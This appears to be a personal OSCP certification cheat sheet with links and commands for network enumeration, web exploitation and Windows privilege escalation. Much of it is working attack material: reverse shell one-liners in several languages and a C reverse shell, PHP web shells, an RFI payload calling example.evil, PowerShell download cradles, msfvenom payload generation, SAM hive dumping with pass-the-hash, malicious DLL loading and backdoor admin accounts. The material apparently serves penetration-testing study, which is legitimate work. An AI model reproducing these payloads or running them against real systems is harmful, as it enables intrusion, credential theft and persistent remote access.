# OSCP-shortsheet
- 🚀 Prepared as part of my OSCP journey.

# METHODOLOGY (MUST READ)
- https://github.com/adon90/pentest_compilation?tab=readme-ov-file
- https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
- https://topi.gitbook.io/t0pitheripper/master/attacks

# Best summary
https://parzival.sh/blog/my-oscp-notes-and-resources

# Guides
- https://docs.gorigorisensei.com/tech-skills-needed/vim
- https://dev.to/adamkatora/how-to-use-burp-suite-through-a-socks5-proxy-with-proxychains-and-chisel-507e
- https://www.geeksforgeeks.org/linux-commands/?ref=lbp
- https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- https://hacktricks.boitatech.com.br/windows/active-directory-methodology/silver-ticket
- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
- https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Active%20Directory.md
- https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
- https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
- https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
- https://notes.benheater.com/books/network-pivoting/page/penetrating-networks-via-chisel-proxies
- https://oscp.cyberdefendersprogram.com/oscp-the-exam    (msfvenom is allowed for unlimited use on the exam to create your reverse shell payloads (shell/reverse_tcp and shell_reverse_tcp))

# resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- https://github.com/brianlam38/OSCP-2022/tree/main/Tools
- https://book.jorianwoltjer.com/

# AD specific resources
- https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce#pass-the-hash
- https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md
- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/active_directory.md

# Priesc specific resources
1. (best)https://exploit-notes.hdks.org/exploit/linux/post-exploitation/linux-backdoors/
2. https://gist.github.com/ssstonebraker/fb2c43ad37a8a704bf952954ce95ec40
3. https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/
4. https://guide.offsecnewbie.com/privilege-escalation/linux-pe
5. https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e
6. https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/windows_enumeration_and_privilege_escalation.md
7. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
8. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
9. https://www.hackingarticles.in/category/privilege-escalation/
10. https://gist.github.com/Andross/bf990e87f3594dff58feb385e96c6b12

# all about shells
https://github.com/r4hn1/Pentesting-Cheatsheet

# writeups
- https://v3ded.github.io/categories/
- https://0xdf.gitlab.io/

# Brief Pentest command cheatsheet
- https://github.com/deo-gracias/oscp/blob/master/pentest_command_cheat_sheet.md

# Initial Access 

## Connection
* attacker: `rlwrap nc -nlvp 4444`
* target: `nc -nv 10.10.0.25 666 -e /bin/bash` or `nc.exe 192.168.100.113 4444 –e cmd.exe`

## Enumeration
1. https://github.com/oncybersec/oscp-enumeration-cheat-sheet?tab=readme-ov-file#ssh-22tcp
2. https://docs.gorigorisensei.com/ports-enum/port-80

### Port Scan
```bash
#quick scan
sudo nmap -T4 -F x.x.x.x  
#fullscan
sudo nmap -sS -Pn -p- -A x.x.x.x
#udp scan
sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x  
#output to file
sudo nmap -sC -sV x.x.x.x -oN scanresult.txt
```
```bash
#rustscan
#quick
rustscan -a IP -r 1-65535
#detailed nmap - Service Scan, Version Scan, OS Detection
rustscan -a IP -r 1-65535 -- -A
```
```bash
#Autorecon
sudo autorecon 192.168.175.98
# Scan multiple targets
sudo autorecon -o enumeration $ip1 $ip2 $ip3 $ip4
```
```bash
#powershell's port scan
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts x.x.x.x"
```

### FTP (21)
- A few common passwords or usernames (if unknown) such as admin, administrator, root, ftpuser, test etc. should be tried if anonymous authentication is disabled on the remote FTP server
- common FTP command (https://steflan-security.com/ftp-enumeration-guide/)
```bash
#FTP Enum
nmap –script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1

#use FileZilla
#or use browser
ftp://X.X.X.X/ 

ftp X.X.X.X
#provide anonymous as username
#provide any passowrd

#FTP connect
ftp IP -p <<passive mode port no.>>

#recursive (-r) or (-m) download all files
wget -r ftp://username:passsword@IP
wget -m ftp://username:passsword@IP

#Ftp Nmap Scan  
nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-syst -p21 <RHOST>

#bruteforce credentials
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
```

### SSH (22)
```bash
nc $IP 22

#private key - id_rsa
#public key - id_rsa_pub
#connect using private key: ssh username@IP -i id_rsa

#generate SSH keys (called fileup and renamed it as authorized_keys)
ssh-keygen
cat fileup.pub > authorized_keys

#connecting to target using private key (at port 2222)
rm ~/.ssh/known_hosts
- ssh -p 2222 -i fileup root@mountaindesserts.com

#Bruteforce SSH
hydra -l root -P /usr/share/wordlists/password/10k <RHOST> -t 4 ssh
```

### SMTP
`nc -nv IP 25`
-    Nmap Enumeration  
     `sudo nmap --script "smtp-commands,smtp-open-relay,smtp-vuln*" -p25 <RHOST>`
-    User Enumeration  
     `sudo nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} -p25 <RHOST>`
-    Version Scan  
     `auxiliary/scanner/smtp/smtp_enum`
-    Introduction  
     `HELO <LHOST> || EHLO <LHOST>`
-    Enumerate Users  
     `EXPN <user> || VRFY <user>`

### Kerberos Port 88
-    Use [Kerbrute](https://github.com/ropnop/kerbrute) to Enumerate Users and Passwords       
-    [Rubeus](https://github.com/GhostPack/Rubeus)  

### Web scan (80, 443, 8080, 8081, 8443, and 3000)
```bash
#Nikto
nikto -h x.x.x.x

#Directory Brute Force (1)
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt-t 20 -x .txt,.php
gobuster dir -u https://10.129.168.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#Directory Brute Force (2)
gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -s "200,204,301,302,307,403,500" -k -t 16 -o "tcp_port_protocol_gobuster.txt"  

python3 /opt/dirsearch/dirsearch.py -u $url -t 16 -e txt,html,php,asp,aspx,jsp -f -x 403 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch.txt"

Dirbuster (GUI): only perform extension brute force - disable 'Brute Force Dirs'

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -t 16 $url/FUZZ 2>&1 | tee "tcp_port_http_wfuzz.txt"

# Directory brute force recursively with max depth = 2
python3 /opt/dirsearch/dirsearch.py -u $url/apps/ -t 16 -e txt,html,php -f -x 403 -r -R 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch_apps.txt"

#Wfuzz
wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
wfuzz -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -- hc 400,404,500 http://x.x.x.x/FUZZ

#Joomla
joomscan http://$IP

#cmsmap - scans for vuls in CMS
cmsmap.py https://x.x.x.x

#wpscan - scans for vuls in wordpress
wpscan --url https://x.x.x.x
 wpscan --url http://192.168.50.244 --enumerate p --pluginsdetection aggressive -o websrv1/wpscan    #scan plugins
#bruteforce wpscan
wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/s/best1050.txt -- username admin -- threads 10
```
#### All other web apps
- https://docs.gorigorisensei.com/web-apps 

### RPC (111, 135)
```bash
# List all registered RPC programs
rpcinfo -p $ip

# Provide compact results
rpcinfo -s $ip
```

```bash
rpcclient -U "" -N $ip
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

### SMB Enumeration (139, 445)
- <if all fails, try manual inspection> https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#manual-inspection
- https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
- SMB can run: directly over TCP (port 445) OR via Netbios API (137/139)
- always check autorecon scans results on the SMB version to find exploitation

```bash
#Version Scan (meterpreter)
use auxiliary/scanner/smb/smb_version

#checking Null session and check share listing (-N = no password)
smbmap -H x.X.X.x
rpcclient -U "" -N [ip]

# Check Null Sessions: connect to the share. Can try without a password (or sending a blank password) and still potentially connect.
smbclient \\\\x.x.x.x\\[sharename e.g.wwwroot]

#Enumerate shares (focus on those with READ/WRITE access)
nmap --script smb-enum-shares -p 445,139 $ip
crackmapexec smb <RHOST> --shares

#Enumerate vulnerabilities
nmap --script smb-vuln* -p 139,445 x.x.x.x Pn

#account login
smbmap -u username -p password -H <target-ip>
smbmap -u username -p password -H <target-ip> -x 'ipconfig'

#Log Into Shares  
smbclient //<RHOST>/<Share> -U <user>
     
#Dump Info  
python3 /usr/share/doc/python3-impacket/examples/samrdump.py <RHOST>

#Dump Info  
rpcclient -U "" <RHOST>`<br><br>
```

#### SMB commands
- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#manual-inspection 
```bash
smb> ls
#download
smb> get sample.txt
smb> get "Example File.txt"
#upload (If the website is associated with the SMB server, we can upload reverse shell script such as aspx, php and get a shell.)
smb> put example.txt
smb> put shell.aspx

#to trigger reverse shell script in smb
access to https://example.com/path/to/smb/share/shell.aspx
```

### SNMP (161)
```bash
# Enumerate entire MIB tree
snmp-check <RHOST>
snmpwalk -c public -v1 -t 10 $ip
snmpcheck -t $ip -c public
snmpwalk -c public -v1 $ip 1|
grep hrSWRunName|cut -d\* \* -f
snmpenum -t $ip
onesixtyone -c names -i hosts

# Enumerate Windows users
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25

# Enumerate open TCP ports
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3

# Enumerate installed software
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2
```

### LDAP Port 389
```bash
ldapsearch  
ldapsearch -h <rhost> -x
ldapsearch -h <rhost> -x -s base namingcontexts 
ldapsearch -h <rhost> -x -b "<information from previous command>"
ldapsearch -h <rhost> -x -b "<information from previous command>" '(objectClass=Person)' 
```

### HTTPS 443
```bash
# Manually Check Certificate

#Add DNS Names to /etc/hosts  
#SSL Enum    
nmap -sV --script ssl-enum-ciphers <RHOST>
     
#Nikto  
nikto -h <RHOST> -p 443 -output nikto_443

#SSLScan  
sslscan <ip>
```

### MSSQL (1433)
```bash
# Nmap Scan  
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER <RHOST>

#Log In  
 sqsh -S <RHOST> -U <user>

# MSSQL shell
mssqlclient.py -db msdb hostname/sa:password@$ip

# List databases
SELECT name FROM master.dbo.sysdatabases

# List tables
SELECT * FROM <database_name>.INFORMATION_SCHEMA.TABLES

# List users and password hashes
SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name
```

### MySQL (3306)
```bash
# Version detection + NSE scripts
nmap -Pn -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_3306_mysql_nmap.txt" $ip
MySQL shell

mysql --host=$ip -u root -p
MySQL system variables

SHOW VARIABLES;     
Show privileges granted to current user

SHOW GRANTS;
Show privileges granted to root user

# Replace 'password' field with 'authentication_string' if it does not exist
SELECT user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv FROM mysql.user WHERE user = 'root';
Exact privileges

SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;     
Enumerate file privileges (see here for discussion of file_priv)

SELECT user FROM mysql.user WHERE file_priv='Y';
```

### any other protocol Emuneration
- https://docs.gorigorisensei.com/ports-enum 

## Searching exploits
```bash
searchsploit *duplicator*
searchsploit -x *50420*  #Searchsploit command to examine a specific exploit
 searchsploit -m *50420* #SearchSploit command to copy the exploit script to the current directory
```

#### LFI - often chained with php exploits. upload php payload and use LFI to read the payload and execute
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
```bash
#LFI check - Unix
<base url>/../../../../../../etc/passwd
<base url>/../../../../../../etc/passwd%00
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500

#LFI check - Windows
<base url>/../../../../../../../windows/system32/drivers/etc/hosts
.././../../../../../../../../windows/system32/drivers/etc/hosts
../../../../../../../../../../windows/system32/drivers/etc/hosts%00
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts%2500

#LFI exploit
#(1) expect://
http://x.x.x.x/blah?parameter=expect://whoami

#(2) data://
http://x.x.x.x/blah?parameter=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==
# the base64 encoded payload is: <? phpinfo(); ?>

#(3) input://
http://x.x.x.x/blah?parameter=php://input
# POST data (using Hackbar)
<? phpinfo(); ?>

#Base64 conversion
echo -n '<?php system($_GET['c']); ?>' | base64
#output is PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
```

#### RFI
```bash
http://example.com/index.php?page=http://example.evil/shell.txt

#Null Byte #
http://example.com/index.php?page=http://example.evil/shell.txt%00
```

## Reverse Shell payload
- https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/
- https://www.revshells.com/ #Reverse Shell Generator
- https://highon.coffee/blog/reverse-shell-cheat-sheet/- https://guide.offsecnewbie.com/shells
- Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
- If connections drops or can not be established, try different ports 80,443,8080...

```bash
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
/bin/bash -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
/bin/sh -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
```

```Python
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```Perl
perl -e 'use
Socket;$i="x.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh-i");};'

#Perl Windows
perl -MIO -e '$c=new IO :: Socket :: INET(PeerAddr,"x.x.x.x:4444");STDIN->fdopen($c,r);$ ~- >fdopen($c,w);system$_ while<>;'
```

```PHP
php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```Ruby
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
#Netcat
nc -e /bin/sh x.x.x.x 4444
nc -e cmd.exe x.x.x.x 4444
/bin/sh | nc x.x.x.x 4444
rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 4444 0/tmp/p
```

```c
// gcc reverse.c -o reverse
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char ** argv)

int scktd;
struct sockaddr_in client;

client.sin_family = AF_INET;
client.sin_addr.s_addr = inet_addr("x.x.x.x"); // attacker IP
client.sin_port = htons(4444); // attacker port

scktd = socket(AF_INET,SOCK_STREAM,0);
connect(scktd,(struct sockaddr *)&client,sizeof(client));

dup2(scktd,0); // STDIN
dup2(scktd,1); // STDOUT
dup2(scktd,2); // STDERR

execl("/bin/sh","sh","-i",NULL,NULL);

return 0;
```

## Web Shell
- php : https://github.com/ivan-sincek/php-reverse-shell?tab=readme-ov-file
- aspx : https://github.com/borjmz/aspx-reverse-shell
```php
#wordpress
http://x.x.x.x/404.php?cmd=id
http://x.x.x.x/404.php?cmd=nc x.x.x.x 4444 -e /bin/sh

<? php echo shell_exec($_GET['cmd']); ?>
<? passthru($_GET["cmd"]); ?>
<? php echo shell_exec($_GET["cmd"]); ?>

#phpMyAdmin
<? php system("/usr/local/bin/wget http://x.x.x.x:4444/php-reverse-shell.php -O /var/tmp/hodor.php 2>&1"); ?>

#SQLQuery
SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"

#LFI reverse shell
http://x.x.x.x/blah?parameter=/etc/passwd%00
```



# Window Priv Esc
## Tools
1. [winPEAS](https://github.com/carlospolop/priviledge-escalation-awesome-scripts-suite/tree/master/winPEAS)
2. [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
   - `IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')`
   - `powershell -exec bypass` -> `..\PowerUp.ps1` -> `Invoke-AllChecks`
3. [Seatbelt](https://github.com/GhostPack/Seatbelt)
4. [accesschk.exe](https://github.com/Andross/oscp/raw/main/accesschk.exe)
* Checks user access control rights. This tools can be used to check wheter a user or group has access to files, directorys, services, and registry keys.
* You can supply the tool with different usernames to check for:
`.\accesscheck /accepteula -uvqc username servicename`
**check service permissions (Which users can access and with what level of permissions)**
`.\accesscheck /accepteula -quvw "C:\This\Is\The\Path"`
**check for start stop permission**
`.\accesscheck /accepteula -uvqc servicename`
**Find all weak folder permissions per drive.**
`accesschk.exe -uwdqs Users c:`
`accesschk.exe -uwdqs "Authenticated Users" c:\`
**Find all weak file permissions per drive.**
``accesschk.exe -uwqs Users c:.``
``accesschk.exe -uwqs "Authenticated Users" c:.``

5. [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)
- `IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')`
- `powershell.exe -nop -exec bypass` -> `PS C:\> Import-Module .Sherlock.ps1` -> `PS C:\> Find-AllVulns`

### Windows Exploits DB
- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/abatchy17/WindowsExploits

## Enumeration (https://github.com/gquere/WindowsPentestCommands)
### Pre-checks
1. Reverse shell with msfvenom (Note: will be blocked by antivirus)
 `msfvenom -p windows/x64/shell_reverse_ tcp LHOST=x.x.x.x LPORT=XXXX -f exe -o reverse.exe`
 Note: change exe to dll, or msi, and change the extension of output for other filetypes
2. IF RDP is avaialble or can be enabled, we can add a low privileged user to the admin group and then spawn a shell (net localgroup administrators <username> /add) 

### User
```bash
#which user
whoami
whoami /groups
whoami /priv

#what local accounts users
net users

#check for admin privilege
net localgroup administrators

#List and get domain user info
net user /domain
net user <username> /domain

#Get domain info
echo %userdomain%
echo %userdnsdomain%
systeminfo

#Domain controllers, including PDC info
nltest /dclist:

#list all saved creds from Credential Manager
cmdkey /list

#users who are logged in in current session/connected users
qwinsta
quser
```

### Permissions
```bash
#listing permissions
icacls C:\Windows\SYSVOL\whatever

#granting permissions
icacls **C:\Windows\SYSVOL\whatever /grant** "NT AUTHORITY\Authenticated Users":F
```

### Services
```bash
net start
sc query
wmic service get
```

### Password
```
#fgdump.exe
/usr/share/windows-binaries/fgdump/fgdump.exe
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

### Network
```bash
#check network adapter
ipconfig /all

#display routing table
route print

#check ports that are alr opened
netstat -ano
netstat -a -p TCP

#check host -  IP address associated with a hostname, bypassing the DNS lookup process.
C:\WINDOWS\System32\drivers\etc\hosts

#check firewall
netsh firewall show state
netsh firewall show config
netsh dump
```

## Windows common command
### Adding Users Locally
```bash
net user /add kek ABCabc123
net localgroup Administrators kek /add
```

### Adding Users in Domain
```bash
net user kek ABCabc123 /add /domain          #username=kek, pw=ABCabc123
net group "Domain Admins" kek /add /domain    #groupname= Domain Admins, user to add=kek
```

### installed app
x32: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
x64: `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

### Get running processes
`Get-Process`
to get the binary file path of the running process: 
1. `wmic process get name,processid,executablepath`
2. `powershell "Get-Process | Select-Object Name, Id, Path"`

### Run command as another user
```bash
runas /user:**domain\user** cmd.exe
```

## Windows PE vectors
1. The version of the operating system
2. Any Vulnerable package installed or running
3. Files and Folders with Full Control or Modify Access
4. Mapped Drives
5. Potentially Interesting Files
6. Unquoted Service Paths
7. Network Information (interfaces, arp, netstat)
8. Firewall Status and Rules
9. Running Processes
10. AlwaysInstallElevated Registry Key Check
11. Stored Credentials
12. DLL Hijacking
13. Scheduled Tasks

## Windows PE methods
### Manual Enum
- https://github.com/seal9055/oscp-notes/blob/main/README.md#Post-Exploitation-Windows

0. Quick Wins
-   Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:  
    `whoami` 
    `net user "%username%"`

-   Try the getsystem command using meterpreter - rarely works but is worth a try
    `meterpreter > getsystem`

1. Scheduled Task/Job
- Detection 1a: WinPEAS (under scheduled task), ensure that `scheduled task state = enabled` and `schedule type = daily` and `repeat every = 5 min` e.g.), `Author: NT AUTHORITY\SYSTEM or administrative user`
- Detection 1b: `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe` ->  to check that non-administrative user can (W) or (F) to modify BackendCacheCleanup.exe at the directory.
- Detection 2a: `schtasks /query /fo LIST /v`, ensure that `scheduled task state = enabled` and `schedule type = daily` and 'repeat every = 5 min` e.g.), `Author: NT AUTHORITY\SYSTEM or administrative user`
- Detection 2b: `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe` ->  to check that non-administrative user can (W) or (F) to modify BackendCacheCleanup.exe at the directory.
- Exploitation: Replace the file found in "Task to Run" with reverse shell payload using `echo path_to_shell >> path_to_scheduled_script`, while setting up nc listener on kali. 
- Exploitation on (Windows 2000, XP, or 2003), we can try creating a New Scheduled Task

2. AlwaysInstallElevated (method 1 - via .msi payload)
- Detection: AlwaysInstalledElevated Policy must be enabled in the Computer Configuration and User Configuration folders of the Local Group Policy editor. run `cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'` to know the architecture of OS before crafting 1.msi
- Exploitation: First, generate 1.msi a.k.a backdoor
```bash
# on kali
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > /root/Desktop/1.msi
upload /root/Desktop/1.msi .
nc -nvlp 4567

#on victim
msiexec /quiet /qn /i 1.msi 
```

```backdoor or 1.msi
to be inserted
```

2. AlwaysInstallElevated (method 2 - Adding user in Administrators Group)
- Detecton: `net user` to find a non-admin user in Local Users group that you want to PE
```bash
#on kali
msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi > /root/Desktop/2.msi
upload /root/Desktop/2.msi .

#on victim
shell
msiexec /quiet /qn /i 2.msi
net user [username]
```

3. Windows Kernel Exploit
- Detection: `./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt`
- Windows ClientCopyImage Win32k Exploit
- Windows TrackPopupMenu Win32k NULL Pointer Dereference
- Windows SYSTEM Escalation via KiTrap0D
- Windows Escalate Task Scheduler XML Privilege Escalation
- MS16-016 mrxdav.sys WebDav Local Privilege Escalation
- EPATHOBJ::pprFlattenRec Local Privilege Escalation
- MS13-053: NTUserMessageCall Win32k Kernel Pool Overflow
- MS16-032 Secondary Logon Handle Privilege Escalation
- RottenPotato
- ...

4. SeBackupPrivilege - can be used on host and Domain Controller(not covered)
- Detection: `evil-winrm -i 192.168.1.41 -u aarti –p "123"` -> `whoami /priv` -> look for SeBackupPrivilege (enabled)
- Exploitation:
```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

#download Temp folder with sam and system from victim to kali
cd Temp
download sam
download system

#use pypykatz (mimikatz) on kali to extract Admin's NTLM hashes
pypykatz registry --sam sam system

#use the extracted NTLM hash to access back to victim
evil-winrm -i 192.168.1.41 -u administrator -H "##Hash##"
net user admin
```

5. DnsAdmins to DomainAdmin
- Detection: `whoami /groups` -> see if DnsAdmins are in the groups
- Exploitation: as member of the DnsAdmins group can run the DLL file with elevated privileges. To exploit that privilege, we need to craft a malicious DLL file, transfer the dll via SMB, stop and start DNS service.
```
#on kali
evil-winrm -i 192.168.1.172 -u jeenali -p "Password@1"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f dll > raj.dll
smbserver.py -smb2support rai /root

#on victim to download the dll and restart the DNS service
dnscmd.exe /config /serverlevelplugindll \\192.168.1.5\raj\raj.dll
sc stop dns
sc start dns

#on kali to catch reverse shell
nc -nvlp 4444
```

6. SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- https://juggernaut-sec.com/seimpersonateprivilege/#Impersonating_the_Local_SYSTEM_Account_with_Juicy_Potato
- Whenever a user is assigned the SeImpersontatePrivilege, the user is permitted to run programs on behalf of that user to impersonate a client. 
- Detection: whoami /priv, either SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege should be enabled
- Exploitation: We can use Juicy Potato, PrintSpoofer or RoguePotato, RogueWinRM (needs winrm disabled), SweetPotato, and GodPotato.
- Exploitation: Transfer PrintSpoofer.exe to victim and execute
```bash
PrintSpoofer64.exe -i -c cmd
whoami
```

7. Weak Services Permission (Insecure Configuration File Permissions (PTOC) 
- create a service, assign PTOC (pause, start, stop, change) permissions for a user against a service
- Detection: `accesschk.exe /accepteula –uwcqv ignite pentest` , returns SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
```bash
sc.exe create pentest binPath= "C:\temp\service.exe"
cd C:\Program Files (x86)\Windows Resource Kits\Tools
subinacl.exe /service pentest /grant=msedgewin10\ignite=PTOC
#Detection: confirm PTOC access to pentest for user Ignite 
accesschk.exe /accepteula –uwcqv ignite pentest

#on kali
msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe >  shell.exe
python –m SimpleHTTPserver 80

#back to victim
cd c:\Users\public
powershell wget http://192.168.1.3/shell.exe -o shell.exe
dir
sc config pentest binPath= "C:\Users\Public\shell.exe"
net start pentest

#back to kali
nc –lvp 8888
whoami
```

8. Weak Services Permission ( Insecure Service Executable (PTO)
- If the low-privilege user has at least Pause/continue, Start, and Stop permissions for the service, an attacker may attempt to overwrite the system binaries with a malicious executable file in order to escalate privileges.
- Detection: `accesschk64.exe "c:\temp\service.exe"`, returns RW Everyone
- Exploitation: rename legit service name to .bak, exploit shell to take the name of legit service. Then run `net start pentest` to trigger the exploit shell.
- https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/

9. Weak Registry Permission
- By hijacking the Registry entries utilized by services, attackers can run their malicious payloads. Attackers may use weaknesses in registry permissions to divert from the initially stated executable to one they control upon Service start, allowing them to execute their unauthorized malware.
- Detection: `accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services`, returns KEY_ALL_ACCESS
- Detection using WinPEASx64, ![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/bec1d1c0-f291-4e4b-9470-634bdfdfd551)

```bash
msfvenom –p window/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe > shell.exe
python –m SimpleHTTPServer 80

#on victim
cd c:\Users\public
powershell wget http://192.168.1.3/shell.exe -o shell.exe
dir
reg add "HKLM\system\currentcontrolset\services\pentest" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f
net start pentest

#back on kali
nc –lvp 8888
whoami
```

10. Unquoted Service Path
- If the path to the service binary is not enclosed in quotes and contains white spaces, the name of a loophole for an installed service is Service Unquoted Path. As a result, a local user will be able to elevate the privilege to administrator privilege shell by placing an executable in a higher level directory within the path.
- Detection: `powershell -ep bypass` -> `./PowerUp.ps1` -> `Get-UnquotedService`
- Detection outcome and Precondition: under ModifiablePath -> BUILTIN\Users, and then checks if any binary paths have a space and aren’t quoted.
